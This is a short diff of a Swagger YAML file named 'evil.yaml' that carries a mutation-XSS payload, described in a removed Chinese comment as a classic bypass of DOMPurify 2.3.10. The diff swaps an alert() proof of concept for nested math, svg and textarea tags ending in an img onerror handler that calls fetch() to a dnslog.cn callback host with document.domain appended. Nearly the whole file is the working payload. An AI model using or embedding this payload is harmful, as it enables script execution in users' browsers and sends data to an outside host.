@@ -1,13 +1,13 @@
-# evil.yaml
 swagger: "2.0"
 info:
   description: |
-    <!-- 针对 DOMPurify 2.3.10 的经典 mXSS -->
     <math>
       <mtext>
-        <option><FAKEFAKE><option></option>
-        <mglyph>
-          <svg>
-            <mtext>
-              <textarea>
-                <a title="</textarea><img src=x onerror=alert(document.domain)>">
+        <table>
+          <mglyph>
+            <svg>
+              <mtext>
+                <textarea>
+                  <a title="</textarea>
+                  <img src=x onerror="fetch('https://obsy4c.dnslog.cn/'+document.domain)">
+                ">
